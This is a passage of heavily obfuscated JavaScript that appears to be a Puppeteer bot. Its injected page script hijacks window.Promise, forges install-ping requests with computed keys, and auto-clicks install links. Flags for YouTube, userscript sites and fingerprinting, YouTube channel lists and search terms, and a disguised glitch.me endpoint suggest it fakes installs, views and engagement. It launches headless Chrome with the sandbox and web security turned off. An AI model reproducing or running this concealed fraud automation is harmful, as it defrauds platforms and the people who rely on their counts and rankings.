                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2464 + 0x18c2 + -0x9d * -0x13 | L >>> 0x115a + -0xde6 + -0x359) + (M & N | ~M & O) + P + (-0x5afb * -0x1af53 + 0x7d004a4a + -0xbbc7e512) + Q[J] << -0x239b + -0x3 * -0x81f + 0xb3e * 0x1) << 0x2264 + -0x1c6c + -0x1 * 0x5f3 | P >>> 0x1e * -0xb7 + 0x1118 + 0x1 * 0x475) + (L & (M = M << -0xca1 + 0xb * 0x35a + 0x1 * -0x181f | M >>> -0x2707 + 0x1edd + -0x20b * -0x4) | ~L & N) + O + (-0x69358a4c + -0x210e0948 + 0xe4c60d2d) + Q[J + (-0x21 * 0x89 + -0x2fe * 0xc + 0x3592)] << -0x81b + 0x60 * -0x11 + 0xe7b) << 0x1 * -0x145a + 0x18e + 0x12d1 | O >>> 0x91f * -0x1 + -0x16f + -0x1 * -0xaa9) + (P & (L = L << 0x14a1 + -0x8a9 + -0xbda | L >>> -0x1a3f + -0xb2a + 0x256b) | ~P & M) + N + (0x29 * 0x1b6848d + -0x126ad * -0x6611 + -0x3bf6e7 * 0x19f) + Q[J + (-0x20d0 + 0x1 * 0x3d7 + -0x9a9 * -0x3)] << 0xdee + -0xe80 + -0x2 * -0x49) << -0x4fb * -0x4 + -0x7 * -0x2bd + 0x2 * -0x1389 | N >>> -0x123 * -0x18 + -0x2af * 0x8 + -0x5b5) + (O & (P = P << 0x10f * 0x17 + -0x1417 * -0x1 + -0x2c52 | P >>> 0x12be * 0x1 + -0xe * 0x20d + 0x4fd * 0x2) | ~O & L) + M + (-0xa6fd25b5 + -0x6b7b2669 + -0x1 * -0x16cfac5b7) + Q[J + (0x1 * 0x23c7 + -0xd * 0x234 + -0x720)] << -0xa14 + -0x1087 + 0x31 * 0x8b) << 0x9 * 0x3fb + 0x641 + 0x123 * -0x25 | M >>> -0x1803 + 0xaf1 * 0x3 + -0x8b5) + (N & (O = O << -0xa9e + 0x5d6 + -0x26 * -0x21 | O >>> -0x11 * 0x234 + -0x5 * -0x1f7 + -0x11b * -0x19) | ~N & P) + L + (-0x10fc6b1f * -0x1 + -0x1cebf * -0x4f5b + -0x9 * 0x7c4d1d3) + Q[J + (0xdc4 + 0x1d21 + -0x2ae1)] << -0x2 * -0x170 + 0x743 + -0xa23, N = N << 0x4 * 0x4a7 + -0x2 * -0x10d3 + -0x3424 | N >>> 0x40a * -0x1 + -0xf74 + 0x3 * 0x680;
              for (; J < 0x1431 + -0xd9 * 0x5 + -0xfcc; J += 0x1e1a + -0x10 * -0x1e7 + -0x3c85)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x18bb + 0x25d8 + 0x3e8e * -0x1 | L >>> 0x202c + 0xa34 + -0x2a45) + (M ^ N ^ O) + P + (0x484fc2f1 + -0x18e0819b * 0x5 + 0xa2ecb0b7) + Q[J] << -0x793 * -0x2 + -0x6d * -0x49 + -0x9 * 0x523) << -0x1c92 + 0xe6d * 0x2 + -0x43 | P >>> -0x8 * 0x1d2 + -0x1475 * -0x1 + -0x5ca) + (L ^ (M = M << 0x1 * -0xbc3 + 0x2 * -0xbc9 + 0x2373 | M >>> -0x11 * -0x106 + 0xb9 * -0x2b + 0xdaf) ^ N) + O + (-0x4 * -0x9da7fac + 0xc1adc270 + 0x5544f1 * -0x16f) + Q[J + (0x1457 + 0x1c62 + -0x30b8)] << 0x1 * -0xa79 + -0x1f9f + 0x2a18) << 0x1d22 + 0x11b * 0x16 + 0x356f * -0x1 | O >>> 0xe21 * -0x2 + 0x258a + -0x92d) + (P ^ (L = L << 0x15cf + 0x2680 + -0x13 * 0x32b | L >>> -0x1 * -0x15f7 + 0x266b + -0x10 * 0x3c6) ^ M) + N + (-0x6265ac1 + -0x5f2a179 + 0x7af2e7db) + Q[J + (-0x8 * 0x284 + 0x39c + 0x1086)] << -0x1bc3 + 0x11c9 + 0x9fa) << -0x13bd + 0x15f6 + -0x234 * 0x1 | N >>> -0x21d3 + -0x1f19 + -0x1f * -0x219) + (O ^ (P = P << 0x2705 + -0x3cf + -0x2 * 0x118c | P >>> -0x1b76 + 0x2178 + -0x100 * 0x6) ^ L) + M + (0x746b0063 + -0x457a3fad + 0x3fe92aeb * 0x1) + Q[J + (0x11 * 0x61 + -0x18eb + -0x1 * -0x127d)] << -0x128d + -0x1e5 + -0xa39 * -0x2) << -0x1f3a * -0x1 + 0x1 * 0x8e0 + 0x1f * -0x14b | M >>> 0x7 * -0xc9 + 0x1323 + 0x9 * -0x181) + (N ^ (O = O << 0x7 * 0x45c + -0x3 * 0x767 + -0x831 | O >>> 0x13bc + 0x2 * -0x73c + -0x2 * 0x2a1) ^ P) + L + (-0x1007 * -0x1623a + 0xc9e0faa6 * -0x1 + 0x440d7d * 0x445) + Q[J + (-0x729 + 0x15be + 0x4db * -0x3)] << -0x5ec * -0x4 + 0x709 * 0x1 + -0x8f * 0x37, N = N << 0x4b * 0x20 + -0x3c * -0x1 + 0x5a * -0x1b | N >>> 0x2090 + -0x26f0 + 0x1 * 0x662;
              for (; J < 0x1 * -0x412 + 0x2 * 0x427 + -0x400; J += 0x1081 + 0x22ba + 0x39 * -0xe6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x207 * -0x5 + -0x1e26 + 0x1408 * 0x1 | L >>> -0x2526 + 0x1aa1 + 0xaa0) + (M & N | M & O | N & O) + P - (0xd458162c + 0x174b4ec6 * 0x9 + -0x1351997fe) + Q[J] << -0x2 * -0xc83 + 0x32a + 0x148 * -0x16) << 0x258c + -0x2589 + 0x2 | P >>> 0x4d8 + -0x1ba2 + -0x16e5 * -0x1) + (L & (M = M << -0x258d * 0x1 + -0x1 * 0x1c97 + 0x4242 | M >>> 0x3 * 0xa3d + 0x16bb + 0x168 * -0x26) | L & N | M & N) + O - (-0x1688d4 * -0x735 + -0x9d413ef6 + 0x7b2194d * 0xe) + Q[J + (0x30f * 0x1 + 0xd4d + -0x105b)] << -0x1a3 + -0x25c6 * 0x1 + 0x2769) << 0xad0 + -0x8c0 + -0x20b * 0x1 | O >>> -0x2045 + 0x569 * -0x7 + -0x7 * -0xa09) + (P & (L = L << -0x14a3 + 0xa61 * 0x2 + 0x1 * -0x1 | L >>> -0xbec + 0x914 * 0x1 + -0xa * -0x49) | P & M | L & M) + N - (-0x109c9ed * -0x7a + -0x1abdd8cf * 0x5 + 0x77ef443d) + Q[J + (-0x91 * -0x3d + -0x18e8 + 0x9a3 * -0x1)] << -0x2 * 0x1178 + -0x4 * -0x2b + 0x2244) << -0x1275 + 0xaa3 * -0x3 + 0x3263 | N >>> -0x253 * 0x8 + 0x7 * 0x509 + -0x108c) + (O & (P = P << -0xc4e + -0x1d39 + 0x29a5 | P >>> -0x3 * 0x65d + -0x26f2 + -0x3 * -0x1359) | O & L | P & L) + M - (-0xe0e4c20b + 0x99d8dfe0 + 0xb7f0254f) + Q[J + (0x2630 + -0x976 * 0x4 + -0x55)] << 0xdfa + 0x1 * 0xa99 + -0x2bb * 0x9) << -0x4bb + -0xf9d + 0x145d | M >>> -0x1981 + -0x1427 * 0x1 + 0x2dc3) + (N & (O = O << 0x1bef + -0xc5 * 0x16 + -0xae3 | O >>> -0x1 * -0x916 + 0x2b0 + 0x4 * -0x2f1) | N & P | O & P) + L - (-0x1268d68e * -0x5 + -0x30e5 * 0x482b + 0x22a0b0d5) + Q[J + (0x4 * 0x499 + 0x139f * 0x1 + -0x25ff)] << 0xc70 + 0xa * 0x18 + -0xd60, N = N << -0x133 * -0x11 + 0x1f05 + -0x334a | N >>> -0x1f3 * -0x3 + -0xa20 + 0x449;
              for (; J < 0xe4 * -0x17 + -0x22ed + 0x37b9; J += -0x948 + 0x927 + 0x13 * 0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1dc1 * -0x1 + 0xc71 + 0x1155 | L >>> 0x8b * 0x3d + -0x23b6 + 0x73 * 0x6) + (M ^ N ^ O) + P - (-0x42724d0b + 0x1cf3488e + 0x5b1c42a7) + Q[J] << -0x9 * -0x6 + -0x12a * 0x14 + -0x1 * -0x1712) << -0x25ce + 0xfd8 + 0x15fb | P >>> 0x22ae + 0x17f2 + -0x3a85) + (L ^ (M = M << 0x1ea7 * -0x1 + 0xf66 + -0x1 * -0xf5f | M >>> -0xd20 + 0x2516 + -0x1ff * 0xc) ^ N) + O - (0xb923643 + -0x10f9eea7 + 0x1 * 0x3b04f68e) + Q[J + (0xfb1 * 0x1 + 0x771 + -0x1721 * 0x1)] << 0x18e4 + -0x1ad * 0x12 + 0x87 * 0xa) << 0xaf0 + 0x2 * -0xee3 + 0x12db | O >>> -0x22e8 + 0x97 * 0x4 + 0x283 * 0xd) + (P ^ (L = L << 0x1ef1 + -0xb68 * 0x3 + 0x365 | L >>> 0x77d * 0x2 + -0x758 + -0x10 * 0x7a) ^ M) + N - (0x54cefd9d + -0x1afc6 * 0x3c5b + 0x6f * 0xa2d481) + Q[J + (0x1754 + -0x3 * 0x772 + -0xfc)] << 0xbf5 + 0x101 * 0x9 + -0x2 * 0xa7f) << 0x1 * 0x1dff + -0x8a1 * -0x2 + -0x4 * 0xbcf | N >>> 0x122 + 0x8ad + -0x33c * 0x3) + (O ^ (P = P << -0x1 * 0x2c9 + -0x25ec + 0x5d5 * 0x7 | P >>> -0x18d * -0x4 + 0x15b2 + -0x1be4) ^ L) + M - (0x23fb96fb + 0x4 * -0x1951c427 + -0x17 * -0x52b826d) + Q[J + (0x4 * 0x40 + -0x8f7 + 0x3fd * 0x2)] << -0x1dba + -0x1e43 + 0x3bfd) << 0x8b4 + 0x1 * 0x1ddb + -0x1 * 0x268a | M >>> -0xc70 + -0x27c + 0xf07 * 0x1) + (N ^ (O = O << 0x1007 + 0x21d1 + -0x31ba | O >>> -0x798 * 0x3 + -0xa * -0xb7 + 0x2 * 0x7d2) ^ P) + L - (0x4bef75ad + -0x1 * 0x36cc41ef + 0x207a0a6c) + Q[J + (0x65 * -0x35 + 0x19 * -0x49 + -0x3 * -0x95a)] << 0x1910 + -0x15a0 + 0x4 * -0xdc, N = N << 0xee6 + -0x1f5b * 0x1 + -0x1093 * -0x1 | N >>> 0x8e6 + -0x31 * -0x7d + -0x20d1;
              this['h0'] = this['h0'] + L << 0x125a + -0x1d22 + 0xac8, this['h1'] = this['h1'] + M << -0x1033 + -0x3 * 0x2b3 + 0x5 * 0x4dc, this['h2'] = this['h2'] + N << -0x1eee + 0x52 * -0x2e + -0xe * -0x343, this['h3'] = this['h3'] + O << 0x83f + -0x1 * 0x291 + 0x5ae * -0x1, this['h4'] = this['h4'] + P << 0x1 * -0xce2 + -0x1 * -0x236c + -0x168a;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x7e * -0x43 + -0x170e + -0x9d0 & -0x1 * 0x1bce + 0x172d + 0x4b0] + w[J >> -0x1 * 0x1f93 + -0x1089 + 0x5 * 0x9a4 & -0x2217 + 0xa08 + 0x181e] + w[J >> -0x1a43 + 0x1359 + -0x2 * -0x37f & -0xd * 0x173 + -0xacb + 0x1 * 0x1db1] + w[J >> 0xf30 + -0x2695 + 0x1775 & -0x1eb6 * 0x1 + -0xe5 * -0x13 + -0x29 * -0x56] + w[J >> -0x942 + 0xc * -0x5 + 0x98a & -0x1a9e * -0x1 + 0x16e8 + -0x1b * 0x1d5] + w[J >> 0x1f31 * -0x1 + 0x1 * -0x79d + 0x136b * 0x2 & 0x2303 + 0x2196 + -0x448a] + w[J >> 0x20e + -0x223d + 0x2033 & -0x18 * -0x88 + 0xceb * -0x1 + 0x3a] + w[0x1e97 + 0x1fde * -0x1 + 0x156 & J] + w[K >> 0x8eb + -0x23ba * -0x1 + 0xd * -0x36d & 0x22ad + 0x4f1 + 0x13 * -0x215] + w[K >> -0x1 * 0x1b31 + -0xd7c + -0xd5 * -0x31 & 0x1 * 0x238a + 0x5ab + -0x17 * 0x1ca] + w[K >> 0xfc4 + -0xd19 * 0x1 + -0x297 & 0x85 + 0x1776 + -0x17ec] + w[K >> -0x137a + -0x250 + 0x15da & 0x1e51 + -0x13df * 0x1 + -0xa63] + w[K >> 0x5 * -0x52 + 0x95b * 0x3 + 0x1a6b * -0x1 & -0xa05 + 0x205 * -0x2 + 0xe1e] + w[K >> 0xa5c + -0xa * -0xa3 + -0x1 * 0x10b2 & 0x1 * 0xdfd + -0x13dd + 0x5ef] + w[K >> -0x22b * 0x5 + -0x29 * 0x95 + 0x22b8 & -0x1f07 + -0x2217 + 0x412d] + w[-0x66f + -0x59a + 0xc18 & K] + w[L >> -0xca6 + 0x1 * 0x212a + -0x28d * 0x8 & -0x32b + -0x63 + 0x39d] + w[L >> -0x12e * -0xf + -0x192c + -0x26 * -0x33 & 0xaf * -0x13 + 0x26cc + -0x19c0] + w[L >> 0x1556 + 0x1cad * -0x1 + 0x76b & -0x2123 + -0x5 * 0xe2 + 0x259c] + w[L >> 0x237e + 0x256c + -0x48da & 0x20d + -0xb * -0x1f3 + -0x176f] + w[L >> 0x2475 + -0x2 * -0x145 + -0xa9 * 0x3b & 0x1 * 0x901 + 0x1 * -0x1679 + -0xd87 * -0x1] + w[L >> -0x1e37 + 0x1 * -0xec + -0x65 * -0x4f & -0x24f * 0x1 + 0xfe4 + 0x6 * -0x241] + w[L >> 0x249e + -0x133e + 0x2c * -0x65 & -0x1829 + 0x2416 + -0x2 * 0x5ef] + w[-0x513 + -0x5ad * -0x1 + -0x8b & L] + w[M >> 0xe4d + 0x10c3 + -0x1ef4 & 0x1 * 0xc6f + -0x1102 + -0x4a2 * -0x1] + w[M >> 0xa58 + 0x1628 + -0x2068 & -0xda4 + -0x223 + 0xfd6] + w[M >> 0x2 * -0xb8b + 0x89c + 0xe8e & 0x22a2 + 0x1721 + -0x39b4] + w[M >> 0x2 * 0x2f0 + -0x4ef + 0x2d * -0x5 & -0x1 * -0x13b8 + 0x327 + -0x2da * 0x8] + w[M >> -0xca * 0x1e + 0x1 * -0xa7 + 0x185f & -0x3c7 * 0x3 + 0x240f + -0x18ab] + w[M >> 0x2c * -0x21 + 0x137 * 0xf + 0x5 * -0x281 & -0x16f0 + 0x195 * 0x13 + -0x710] + w[M >> 0x95b + 0x1b0 + -0xb07 * 0x1 & -0x18d0 * -0x1 + -0x1 * 0xe32 + 0x1 * -0xa8f] + w[0x3b * -0x4f + 0x640 + 0x301 * 0x4 & M] + w[N >> -0x23b * 0xd + -0x139b + 0x30b6 & -0x9 * -0x342 + 0x2 * 0x854 + -0x5 * 0x92f] + w[N >> 0x1a * 0xd3 + -0x1 * 0x2637 + 0x10e1 & -0x544 + -0x1 * 0x1160 + 0x16b3] + w[N >> 0x16e4 + -0x1cc3 + 0x5f3 * 0x1 & 0x16 * -0x10d + 0xa57 * -0x1 + -0x1a * -0x14a] + w[N >> -0x1 * -0x1037 + 0x287 * 0x7 + 0x2 * -0x10ec & -0x1795 + -0x2447 + 0x13f9 * 0x3] + w[N >> 0x26cb + -0xb92 * 0x1 + -0x1b2d & -0x2363 + -0x245b + 0x47cd] + w[N >> 0x10b3 + 0x15d7 + 0x2682 * -0x1 & -0x16b3 + -0xcf5 * 0x2 + 0x5 * 0x9bc] + w[N >> -0x22c5 + 0x50d * 0x3 + 0x13a2 & -0x13f8 + 0x10ec * -0x1 + 0x9 * 0x41b] + w[0x10dc + 0xe7 * -0x1 + 0x7f3 * -0x2 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1800 + 0x22f * -0x1 + 0x1f * 0xd9 & 0x585 + 0x19de + -0x1e64,
                J >> -0xbc5 * -0x2 + 0x167e + -0x2df8 & 0xe14 + 0x92b + -0x1640,
                J >> 0x1e95 + 0xbb1 + -0x2a3e & 0x4f9 + -0x158f * -0x1 + 0x1 * -0x1989,
                0x11d6 + -0x1 * 0xf51 + -0x186 & J,
                K >> 0x104b * -0x1 + -0x268f + 0x36f2 & -0x1d31 + 0x17e9 + 0x647,
                K >> -0x17d4 + -0x2106 + 0x38ea & -0x305 + -0x3ab * 0x5 + 0x165b,
                K >> 0x89 * -0x7 + 0x1d76 + 0x19 * -0x107 & -0x1d97 + -0x192 * 0x13 + -0xa12 * -0x6,
                -0x22bd * 0x1 + 0x14b1 + -0xf0b * -0x1 & K,
                L >> -0x11c4 + 0xc * 0x50 + 0xe1c & 0x10a + -0x5 * 0x449 + 0x1562,
                L >> 0x2 * 0xc15 + 0x16fc + -0x2f16 & -0x4bb + 0x137 * 0x1 + 0x483,
                L >> 0x1709 + 0x1e59 + -0x355a & -0x44d * -0x3 + 0x127b * -0x1 + -0x231 * -0x3,
                -0x1d74 + 0x1e11 * 0x1 + -0x31 * -0x2 & L,
                M >> -0x69e + 0x2196 + -0x1ae0 & -0x18c3 * -0x1 + -0x209 + -0x15bb * 0x1,
                M >> -0x86 * -0x11 + -0xbfb * -0x1 + 0x1 * -0x14d1 & -0x36a + -0x1 * 0x1dd + 0x646,
                M >> 0x130 * 0x14 + 0x1b4e + -0x3306 & -0x1360 + -0xbac + 0x200b,
                -0x1c94 * -0x1 + -0xa * -0x32b + -0x185 * 0x27 & M,
                N >> -0x15 * -0x18d + -0x20bc + 0x43 & 0x884 * -0x4 + 0x406 + -0xe3 * -0x23,
                N >> 0x5b9 + -0x1da2 + 0x17f9 & 0x1 * -0x24e9 + -0x1f7a + -0x1 * -0x4562,
                N >> -0x3 * -0x28d + -0x631 + -0x16e & 0x79 * 0x3b + -0x2 * -0xfb1 + 0x1d23 * -0x2,
                -0x92b * -0x2 + 0xa47 + -0x586 * 0x5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0xbc1 + 0x1d11 + -0x113c), (K = new DataView(J))['setUint32'](0x8b5 + 0x21ac + 0x13 * -0x23b, this['h0']), K['setUint32'](-0x17a8 + 0x115 * 0x11 + 0x547, this['h1']), K['setUint32'](-0x5f2 * 0x4 + -0x26cd + 0x4d1 * 0xd, this['h2']), K['setUint32'](0xc39 + -0x2569 * -0x1 + -0x3196, this['h3']), K['setUint32'](-0x176d + 0x6dd * -0x2 + -0x2537 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x41e + 0x7f * -0x1d + 0xa45];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x4c3 + -0x46d * -0x1 + -0xe * 0xa8;
            J[-0x1466 + 0x2111 + -0xcab]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1258 + -0x151b + -0x1 * -0x2c3] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xa * -0x2f4 + 0x1dc * 0x1 + 0x1f63 * -0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x846 + 0xe9c + -0x16e1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1589 + 0x10c1 + 0xaa4), Promise['resolve'](0x137b + -0xae7 + -0x893);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * -0x1f7d + 0x1134 * -0x1 + -0x30b1 * -0x1; j < 0x1863 + -0x149 + 0x1 * -0x1719; j++)
    i();
}
const NETWORK_PATIENCE = 0x6a * -0x46 + 0x32c + 0x3910 + (0x1cc5 + -0xa * -0x1c3 + -0x22ab) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2580 + -0xc9a * 0x2 + 0x1 * -0xc49) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xa47 + -0x227b + 0x60d * 0x4);
    let h = e[f];
    if (c['TvowdD'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x551 * 0x1 + 0x24 * 0xd7 + -0x238d, r, s, t = 0x21af + 0x200e + -0x41bd; s = m['charAt'](t++); ~s && (r = q % (-0x16d8 * -0x1 + -0x234c + -0x13 * -0xa8) ? r * (-0x1 * 0x1bd7 + -0x1 * 0x1aa7 + 0x36be) + s : s, q++ % (0x3d5 + 0xd * -0x5c + 0xdb)) ? o += String['fromCharCode'](-0x2 * -0x1b3 + 0xfba + -0x1221 & r >> (-(-0x1057 * -0x1 + 0x31 * -0xb3 + 0x11ee) * q & -0x48 * -0x34 + 0x4e2 * -0x2 + -0x2 * 0x26b)) : -0x1d95 + 0x23 * 0xe5 + 0x1 * -0x1ba) {
          s = n['indexOf'](s);
        }
        for (let u = -0xf1c * -0x1 + 0x555 + -0x1471, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x29 * 0xd3 + -0x805 * -0x4 + 0x1c7 * 0x1))['slice'](-(-0x43 * -0x15 + -0x5da * 0x4 + -0x5f9 * -0x3));
        }
        return decodeURIComponent(p);
      };
      c['HHEByk'] = i, b = arguments, c['TvowdD'] = !![];
    }
    const j = e[-0x4 * -0x3af + 0x350 + 0x2 * -0x906],
      k = f + j,
      l = b[k];
    return !l ? (h = c['HHEByk'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xa47 + -0x227b + 0x60d * 0x4);
    let h = e[f];
    if (b['OuESnP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x551 * 0x1 + 0x24 * 0xd7 + -0x238d, s, t, u = 0x21af + 0x200e + -0x41bd; t = n['charAt'](u++); ~t && (s = r % (-0x16d8 * -0x1 + -0x234c + -0x13 * -0xa8) ? s * (-0x1 * 0x1bd7 + -0x1 * 0x1aa7 + 0x36be) + t : t, r++ % (0x3d5 + 0xd * -0x5c + 0xdb)) ? p += String['fromCharCode'](-0x2 * -0x1b3 + 0xfba + -0x1221 & s >> (-(-0x1057 * -0x1 + 0x31 * -0xb3 + 0x11ee) * r & -0x48 * -0x34 + 0x4e2 * -0x2 + -0x2 * 0x26b)) : -0x1d95 + 0x23 * 0xe5 + 0x1 * -0x1ba) {
          t = o['indexOf'](t);
        }
        for (let v = -0xf1c * -0x1 + 0x555 + -0x1471, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x29 * 0xd3 + -0x805 * -0x4 + 0x1c7 * 0x1))['slice'](-(-0x43 * -0x15 + -0x5da * 0x4 + -0x5f9 * -0x3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x4 * -0x3af + 0x350 + 0x2 * -0x906,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xd12 + 0x90e * -0x1 + -0xb1 * -0x20; u < -0x26cb * 0x1 + -0x59 * 0x25 + 0x8 * 0x695; u++) {
          p[u] = u;
        }
        for (u = -0xb31 + -0x874 * 0x4 + 0x2d01; u < -0x6 * 0x109 + 0x1019 * 0x2 + -0x52 * 0x4e; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x2562 + 0x935 * -0x3 + 0x1 * 0x4201), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x194 + 0x272 * -0x8 + 0x1524, q = 0x538 * -0x6 + -0x2135 + 0x4085;
        for (let v = -0x1 * 0x113 + -0xe37 + 0x13 * 0xce; v < n['length']; v++) {
          u = (u + (-0x1 * 0x166f + 0x1 * 0x1f91 + 0x3 * -0x30b)) % (-0x9 * -0x3d + 0xcb8 + -0xddd), q = (q + p[u]) % (0x1e74 + 0x3af + -0x2123), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x60e + 0x10 * -0x17f + 0x12e2)]);
        }
        return t;
      };
      b['OuqRxP'] = m, c = arguments, b['OuESnP'] = !![];
    }
    const j = e[-0x226 + 0x15db + -0x13b5],
      k = f + j,
      l = c[k];
    return !l ? (b['kAQvWJ'] === undefined && (b['kAQvWJ'] = !![]), h = b['OuqRxP'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2e7 * 0x4 + -0x1338 + 0x2 * 0x3ce; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 